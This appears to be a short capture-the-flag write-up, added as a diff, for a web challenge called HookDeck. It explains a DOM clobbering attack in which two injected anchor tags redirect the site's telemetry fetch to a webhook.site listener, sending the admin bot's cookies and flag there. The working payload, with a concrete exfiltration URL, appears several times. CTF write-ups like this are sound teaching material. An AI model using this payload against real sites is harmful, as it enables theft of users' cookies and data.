@@ -1,0 +1,43 @@
+HookDeck
+
+The HookDeck portal is strictly XSS-proof, stripping out all scripts and on* handlers. But their telemetry system relies on a lazy global fallback:
+
+
+--ANSWER--
+ <a id="webhookConfig"></a>
+
+<a id="webhookConfig" name="url" href="https://webhook.site/a6d4901b-7766-4e9b-b2a5-a9b556435aa6"></a>
+
+
+need a very simple small writeup on how to solve ut
+Solution Writeup: HookDeck
+
+The Vulnerability
+The app prevents standard XSS by stripping scripts, but it's vulnerable to DOM Clobbering. The telemetry system blindly trusts window.webhookConfig.url to determine where to send the user's cookies.
+
+The Payload
+HTML
+
+<a id="webhookConfig"></a>
+<a id="webhookConfig" name="url" href="https://webhook.site/YOUR-UNIQUE-ID"></a>
+
+Why it Works
+
+    The Object Trick: By injecting two elements with the exact same id="webhookConfig", the browser automatically groups them into an HTMLCollection on the global window object.
+
+    The Property Trick: The second tag has name="url". Because it's in an HTMLCollection, the JavaScript can access it as window.webhookConfig.url.
+
+    The Extraction: When the fetch() function tries to use that HTML element as a web address, it implicitly converts the anchor tag (<a>) to a text string. This automatically returns the href value.
+
+Steps to Solve
+
+    Generate a free listener URL on webhook.site.
+
+    Put your URL into the payload and submit it into the challenge template builder.
+
+    Click "Submit Pipeline to Integration Admin" to trigger the admin bot.
+
+    Check your webhook dashboard. You will see a POST request containing the GZCTF_FLAG in the JSON body!
+
+<a id="webhookConfig"></a>
+<a id="webhookConfig" name="url" href="https://webhook.site/a6d4901b-7766-4e9b-b2a5-a9b556435aa6"></a>
